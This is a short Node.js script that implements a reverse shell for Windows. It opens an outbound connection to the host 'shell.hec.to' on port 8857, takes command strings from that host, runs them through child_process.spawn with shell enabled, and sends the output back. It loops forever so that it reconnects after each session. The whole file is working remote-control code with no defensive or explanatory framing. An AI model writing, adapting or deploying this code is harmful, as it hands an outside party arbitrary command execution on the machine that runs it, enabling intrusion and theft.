const net = require('net')
const child_process = require('child_process');
var iconv = require('iconv-lite');

const server = net.createServer()

const SERVER_PORT = 8857
const CLIENT_PORT = 8858
const HOST = "shell.hec.to"

let cwd = 'C:\\'

function spawn(executable, args, cwd, onstdout, onstderr) {
    return new Promise((resolve, reject) => {
        let proc = child_process.spawn(executable, args, {cwd,shell:true})
        proc.stdout.on('data', onstdout)
        proc.stderr.on('data', onstderr)
        proc.on('close', resolve)
    })
}

function split_args(command) {
    let [executable, ...args] = command.split(' ')
    if (['dir', 'echo', 'set'].indexOf(executable) > -1) {
        args = ["/c", executable + " " + args.join(" ")]
        executable = "cmd"
    }
    //console.log('args', args)
    return [executable, args]
}

function execute() {
    return new Promise((resolve, reject) => {
        var client = new net.Socket()
        client.connect(SERVER_PORT, HOST, ()=>{
            
        })
        client.on('data', (data) => {
            let command = data.toString()
            let [executable, args] = split_args(command)

            if (executable == 'cd') {
                cwd = args[0]
                executable = 'cmd'
                args = ["/c", "echo %CD%"]
            }
            if (executable == 'exit') {
                return reject()
            }
            //console.log('args', args)

            let buffers = []

            spawn(executable, args, cwd, (data) => {
                //client.write(iconv.decode(data, 'cp866'))
                //buffers.push(data)
                client.write(iconv.decode(data, 'cp866'))

            }, (data) => {
                //buffers.push(data)
                client.write(iconv.decode(data, 'cp866'))
            }).then(() => {
                //client.end(iconv.decode(Buffer.concat(buffers), 'cp866'))
                client.end()
            })

        })
        client.on('close', () => {
            resolve()
        })
    })
}

console.log('server');

(async () => {
    while (true) {
        await execute()
    }
})()